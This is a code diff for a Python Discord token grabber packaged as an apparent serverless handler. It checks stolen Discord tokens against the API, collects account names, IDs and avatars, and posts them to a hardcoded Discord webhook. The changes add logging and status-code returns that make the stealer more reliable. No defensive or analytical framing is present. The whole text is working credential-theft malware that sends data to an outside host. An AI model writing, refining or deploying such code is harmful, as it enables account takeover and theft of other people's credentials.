@@ -1,4 +1,5 @@
 import requests
+import logging
 
 class DiscordTokenGrabber:
     def __init__(self, webhook):
@@ -10,13 +11,16 @@ class DiscordTokenGrabber:
             r = requests.get(self.base_url, headers={'Authorization': token})
             return r.status_code == 200
         except Exception as e:
-            print(f"Validation error: {e}")
+            logging.error(f"Validation error: {e}")
             return False
 
     def upload_tokens(self, tokens):
         if not tokens:
-            print("No tokens found.")
-            return
+            logging.error("No tokens found.")
+            return {
+                "statusCode": 400,
+                "body": "No tokens found."
+            }
 
         for token in tokens:
             try:
@@ -29,7 +33,8 @@ class DiscordTokenGrabber:
                 avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
 
                 # Example image URL
-                image_url = "https://m.media-amazon.com/images/I/61dx3faBVrL._SL1500_.jpg"
+                image_url = "https://example.com/path/to/your/image.jpg"
+
                 embed = {
                     "title": f"{username} ({user_id})",
                     "color": 0x000000,
@@ -45,17 +50,20 @@ class DiscordTokenGrabber:
 
                 requests.post(self.webhook, json={"embeds": [embed]})
             except Exception as e:
-                print(f"Upload error: {e}")
+                logging.error(f"Upload error: {e}")
+                return {
+                    "statusCode": 500,
+                    "body": f"Upload error: {str(e)}"
+                }
 
-# Example usage
+        return {
+            "statusCode": 200,
+            "body": "Tokens uploaded successfully."
+        }
+
 def handler(event, context):
     webhook_url = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"
     tokens = event.get('tokens', [])
 
     grabber = DiscordTokenGrabber(webhook_url)
-    grabber.upload_tokens(tokens)
-
-    return {
-        "statusCode": 200,
-        "body": "Tokens uploaded successfully."
-    }
+    return grabber.upload_tokens(tokens)
